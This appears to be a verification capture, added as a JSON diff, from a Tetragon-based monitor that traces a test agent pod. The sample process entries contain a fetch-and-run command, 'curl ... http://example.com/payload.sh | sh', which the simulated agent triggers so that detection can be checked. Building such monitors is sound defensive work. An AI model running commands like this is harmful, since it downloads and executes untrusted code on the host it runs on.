@@ -1,0 +1,147 @@
+{
+  "spec": "SPEC_02 \u2014 Slice 2 (T1a+T1b) post-fix verification",
+  "captured_at": "2026-06-18",
+  "source": "real kind+Tetragon capture; pod-scoped event-filter + pod-scoped TracingPolicies (argus.dev/track); long_running_agent.py, routable exfil dest, no VPN",
+  "session_id": "ab321caa-50ca-420a-8eb9-8dafd8007d3b",
+  "fixes_verified": {
+    "T1a_event_filter": "agent pod's whole process tree now ingested (was: python only)",
+    "T1b_tracing_policy": "spawned curl's kprobes now captured (was: none \u2014 matchBinaries excluded curl)"
+  },
+  "ingested_process_exec_binaries": {
+    "/kind/bin/mount-product-files.sh": 1,
+    "/usr/bin/sh": 2,
+    "/usr/bin/ls": 5,
+    "/usr/bin/df": 5,
+    "/usr/bin/curl": 1,
+    "/usr/bin/uname": 5,
+    "/usr/bin/cp": 1,
+    "/usr/bin/jq": 1,
+    "/usr/local/bin/python": 1
+  },
+  "sh_curl_exec_ingested_count": 3,
+  "curl_kprobes_captured": {
+    "__arm64_sys_write": 2,
+    "fd_install": 68,
+    "tcp_connect": 1,
+    "tcp_sendmsg": 1,
+    "exec": 2
+  },
+  "sample_sh_exec_raw": {
+    "time": "2026-06-18T13:49:20.172331Z",
+    "node_name": "argus-control-plane",
+    "process_kprobe": {
+      "args": [
+        {
+          "arg": "intArg",
+          "label": "",
+          "intArg": 4
+        },
+        {
+          "arg": "fileArg",
+          "label": "",
+          "fileArg": {
+            "path": "",
+            "flags": "",
+            "mount": "",
+            "permission": "prw-------"
+          }
+        }
+      ],
+      "parent": {
+        "cwd": "/app",
+        "pid": 169439,
+        "pod": {
+          "name": "long-agent-r6br9",
+          "container": {
+            "id": "containerd://3d8b33872522d790420ad0236d05fbd22d4af52c28704ecee2229937c82a5b58",
+            "name": "agent"
+          },
+          "namespace": "default"
+        },
+        "uid": 0,
+        "binary": "/usr/local/bin/python",
+        "exec_id": "YXJndXMtY29udHJvbC1wbGFuZTo5MzgzMDQzMzY3NzYzNzoxNjk0Mzk=",
+        "arguments": "-u long_running_agent.py",
+        "start_time": "2026-06-18T13:47:42.219669Z"
+      },
+      "process": {
+        "cwd": "/app",
+        "pid": 170240,
+        "pod": {
+          "name": "long-agent-r6br9",
+          "container": {
+            "id": "containerd://3d8b33872522d790420ad0236d05fbd22d4af52c28704ecee2229937c82a5b58",
+            "name": "agent"
+          },
+          "namespace": "default"
+        },
+        "uid": 0,
+        "binary": "/usr/bin/sh",
+        "exec_id": "YXJndXMtY29udHJvbC1wbGFuZTo5MzkyODM4Mzg3MzQ3MjoxNzAyNDA=",
+        "arguments": "-c \"curl -s --max-time 3 http://example.com/payload.sh | sh\"",
+        "start_time": "2026-06-18T13:49:20.171005Z"
+      },
+      "function_name": "fd_install"
+    }
+  },
+  "sample_exfil_connect_raw": {
+    "time": "2026-06-18T13:49:20.233878Z",
+    "node_name": "argus-control-plane",
+    "process_kprobe": {
+      "args": [
+        {
+          "arg": "sockArg",
+          "label": "",
+          "sockArg": {
+            "mark": 0,
+            "type": "SOCK_STREAM",
+            "daddr": "104.20.23.154",
+            "dport": 80,
+            "saddr": "10.244.0.10",
+            "sport": 58766,
+            "state": "TCP_SYN_SENT",
+            "cookie": "18446462606544890880",
+            "family": "AF_INET",
+            "priority": 0,
+            "protocol": "IPPROTO_TCP"
+          }
+        }
+      ],
+      "parent": {
+        "cwd": "/app",
+        "pid": 170240,
+        "pod": {
+          "name": "long-agent-r6br9",
+          "container": {
+            "id": "containerd://3d8b33872522d790420ad0236d05fbd22d4af52c28704ecee2229937c82a5b58",
+            "name": "agent"
+          },
+          "namespace": "default"
+        },
+        "uid": 0,
+        "binary": "/usr/bin/sh",
+        "exec_id": "YXJndXMtY29udHJvbC1wbGFuZTo5MzkyODM4Mzg3MzQ3MjoxNzAyNDA=",
+        "arguments": "-c \"curl -s --max-time 3 http://example.com/payload.sh | sh\"",
+        "start_time": "2026-06-18T13:49:20.171005Z"
+      },
+      "process": {
+        "cwd": "/app",
+        "pid": 170241,
+        "pod": {
+          "name": "long-agent-r6br9",
+          "container": {
+            "id": "containerd://3d8b33872522d790420ad0236d05fbd22d4af52c28704ecee2229937c82a5b58",
+            "name": "agent"
+          },
+          "namespace": "default"
+        },
+        "uid": 0,
+        "binary": "/usr/bin/curl",
+        "exec_id": "YXJndXMtY29udHJvbC1wbGFuZTo5MzkyODM4NzU4OTg4OToxNzAyNDE=",
+        "arguments": "-s --max-time 3 http://example.com/payload.sh",
+        "start_time": "2026-06-18T13:49:20.174721Z"
+      },
+      "function_name": "tcp_connect"
+    }
+  }
+}
